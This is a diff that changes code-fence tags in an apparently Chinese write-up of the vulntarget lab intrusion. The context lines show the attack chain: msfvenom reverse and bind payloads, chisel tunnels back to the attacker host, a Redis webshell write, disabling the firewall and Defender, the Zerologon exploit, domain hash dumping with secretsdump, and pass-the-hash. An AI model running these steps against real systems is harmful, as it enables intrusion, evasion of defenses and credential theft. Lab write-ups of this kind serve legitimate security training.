@@ -104,7 +104,7 @@ Pwd: whoami
 
 构造马子实现持久化
 
-```shell
+```bash
 $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.129 LPORT=3333 -f exe > 192.168.200.129-3333.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -119,7 +119,7 @@ Final size of exe file: 7168 bytes
 
 执行监听
 
-```shell
+```bash
 $ msfconsole -q
 msf6 > use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
@@ -150,7 +150,7 @@ msf6 exploit(multi/handler) > exploit
 
 上传 `chisel` 二进制文件
 
-```shell
+```bash
 meterpreter > upload ./tools/chisel-v1.8.1/chisel_1.8.1_windows_amd64.exe
 [*] Uploading  : /home/randark/tools/chisel-v1.8.1/chisel_1.8.1_windows_amd64.exe -> chisel_1.8.1_windows_amd64.exe
 [*] Uploaded 8.00 MiB of 8.59 MiB (93.14%): /home/randark/tools/chisel-v1.8.1/chisel_1.8.1_windows_amd64.exe -> chisel_1.8.1_windows_amd64.exe
@@ -160,7 +160,7 @@ meterpreter > upload ./tools/chisel-v1.8.1/chisel_1.8.1_windows_amd64.exe
 
 启动服务端
 
-```shell title="kali 192.168.200.129"
+```bash title="kali 192.168.200.129"
 $ ./tools/chisel-v1.8.1/chisel_1.8.1_linux_amd64 server -p 1337 --reverse
 2024/10/31 22:44:56 server: Fingerprint ygeqrFtSRXQYYW1Xf04LJNLAtoveMD+jrlJ4jwApR+Y=
 2024/10/31 22:44:56 server: Listening on http://0.0.0.0:1337
@@ -168,7 +168,7 @@ $ ./tools/chisel-v1.8.1/chisel_1.8.1_linux_amd64 server -p 1337 --reverse
 
 建立代理会话
 
-```shell title="win7 192.168.200.10 | 10.0.20.98"
+```bash title="win7 192.168.200.10 | 10.0.20.98"
 C:\>cmd /c chisel_1.8.1_windows_amd64.exe client 192.168.200.129:1337 R:0.0.0.0:10005:socks
 cmd /c chisel_1.8.1_windows_amd64.exe client 192.168.200.129:1337 R:0.0.0.0:10005:socks
 ```
@@ -225,7 +225,7 @@ start vulscan
 
 排除掉 `win7 10.0.20.98` 和 `Vmware 10.0.20.1` 之后，会发现结果不对，因为 Windows Server 会不响应 ICMP 请求，可以通过查看 ARP 表来发现
 
-```shell title="win7 192.168.200.10 | 10.0.20.98"
+```bash title="win7 192.168.200.10 | 10.0.20.98"
 C:\>arp -a
 
 Interface: 192.168.200.10 --- 0xb
@@ -250,7 +250,7 @@ Interface: 10.0.20.98 --- 0xd
 
 可以发现存在有 `10.0.20.99` 主机，尝试扫描
 
-```shell
+```bash
 $ proxychains ./tools/fscan-1.8.4/fscan -h 10.0.20.99 -np
 
 start infoscan
@@ -268,7 +268,7 @@ start vulscan
 
 建立端口转发
 
-```shell title="win7 192.168.200.10 | 10.0.20.98"
+```bash title="win7 192.168.200.10 | 10.0.20.98"
 C:\>cmd /c chisel_1.8.1_windows_amd64.exe client 192.168.200.129:1337 R:0.0.0.0:10001:10.0.20.99:6379
 cmd /c chisel_1.8.1_windows_amd64.exe client 192.168.200.129:1337 R:0.0.0.0:10001:10.0.20.99:6379
 ```
@@ -279,7 +279,7 @@ cmd /c chisel_1.8.1_windows_amd64.exe client 192.168.200.129:1337 R:0.0.0.0:1000
 
 同时做一下目录扫描
 
-```shell
+```bash
 Target: http://10.0.20.99/
 
 [23:56:38] Starting:
@@ -299,7 +299,7 @@ Target: http://10.0.20.99/
 
 直接使用 Redis 未授权写入 webshel
 
-```shell
+```bash
 $ proxychains -q redis-cli -h 10.0.20.99
 10.0.20.99:6379> config set dir "C:/phpStudy/PHPTutorial/WWW/"
 OK
@@ -320,7 +320,7 @@ OK
 
 查看网段信息
 
-```shell
+```bash
 C:\phpStudy\PHPTutorial\WWW> ipconfig
 Windows IP 配置
 以太网适配器 Ethernet0:
@@ -345,7 +345,7 @@ Windows IP 配置
 
 查看当前用户权限
 
-```shell title="win2016 10.0.20.99 | 10.0.10.111"
+```bash title="win2016 10.0.20.99 | 10.0.10.111"
 C:\phpStudy\PHPTutorial\WWW> whoami
 nt authority\system
 ```
@@ -354,7 +354,7 @@ nt authority\system
 
 关闭防火墙
 
-```shell
+```bash
 C:\phpStudy\PHPTutorial\WWW> netsh advfirewall show allprofiles
 �������ļ� ����:
 ----------------------------------------------------------------------
@@ -456,7 +456,7 @@ C:\phpStudy\PHPTutorial\WWW> gpupdate /force
 
 然后基于当前 `nt authority\system` 的用户权限，直接注册表关闭 `Defender`
 
-```shell
+```bash
 C:\phpStudy\PHPTutorial\WWW> REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 操作成功完成。
 ```
@@ -465,7 +465,7 @@ C:\phpStudy\PHPTutorial\WWW> REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Micro
 
 但是经过多次尝试，反向马无法连接，于是尝试构建正向马
 
-```shell
+```bash
 $ msfvenom -p windows/x64/meterpreter/bind_tcp  LPORT=4444 -f exe > 4444.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -478,7 +478,7 @@ Final size of exe file: 7168 bytes
 
 ## 域信息收集
 
-```shell title="win7 192.168.200.10 | 10.0.20.98"
+```bash title="win7 192.168.200.10 | 10.0.20.98"
 meterpreter > arp
 
 ARP cache
@@ -504,7 +504,7 @@ ARP cache
     255.255.255.255  ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Network Connection
 ```
 
-```shell title="win2016 10.0.20.99 | 10.0.10.111"
+```bash title="win2016 10.0.20.99 | 10.0.10.111"
 meterpreter > arp
 
 ARP cache
@@ -529,7 +529,7 @@ ARP cache
 
 在 `win2016` 上探测到域信息
 
-```shell title="win2016 10.0.20.99 | 10.0.10.111"
+```bash title="win2016 10.0.20.99 | 10.0.10.111"
 meterpreter > run post/windows/gather/enum_domain
 
 [+] Domain FQDN: vulntarget.com
@@ -577,7 +577,7 @@ win2016$       VULNTARGET.COM  (null)
 
 在 Meterpreter 中添加路由，并建立代理
 
-```shell title="win2016 10.0.20.99 | 10.0.10.111"
+```bash title="win2016 10.0.20.99 | 10.0.10.111"
 meterpreter > run post/multi/manage/autoroute
 
 [*] Running module against WIN2016
@@ -595,7 +595,7 @@ msf6 auxiliary(server/socks_proxy) > exploit
 
 扫描 `win2019` 开放的端口
 
-```shell
+```bash
 $ proxychains ./tools/fscan-1.8.4/fscan -h 10.0.10.110
 start infoscan
 10.0.10.110:139 open
@@ -623,7 +623,7 @@ start vulscan
 
 然后运行 `run post/multi/manage/autoroute` 做内网路由
 
-```shell
+```bash
 [*] Running module against WIN7-PC
 [*] Searching for subnets to autoroute.
 [+] Route added to subnet 10.0.20.0/255.255.255.0 from host's routing table.
@@ -633,7 +633,7 @@ start vulscan
 
 然后直接连接 `win2016` 的 `windows/x64/meterpreter/bind_tcp` 做持久化，再执行一次内网路由
 
-```shell
+```bash
 [*] Running module against WIN2016
 [*] Searching for subnets to autoroute.
 [+] Route added to subnet 10.0.10.0/255.255.255.0 from host's routing table.
@@ -659,7 +659,7 @@ Active sessions
 
 使用[dirkjanm/CVE-2020-1472: PoC for Zerologon - all research credits go to Tom Tervoort of Secura](https://github.com/dirkjanm/CVE-2020-1472)
 
-```shell
+```bash
 $ proxychains python3 cve-2020-1472-exploit.py WIN2019 10.0.10.110
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
@@ -677,7 +677,7 @@ Exploit complete!
 
 成功更改账户密码之后，获取域哈希信息
 
-```shell
+```bash
 $ proxychains -q impacket-secretsdump vulntarget.com/WIN2019\$@10.0.10.110 -no-pass
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
@@ -711,7 +711,7 @@ WIN2016$:des-cbc-md5:863d8f7c9846c8fe
 
 得到域哈希信息之后，就可以拿下DC的Administrator
 
-```shell
+```bash
 $ proxychains impacket-smbexec -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 Administrator@10.0.10.110 -codec gbk
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
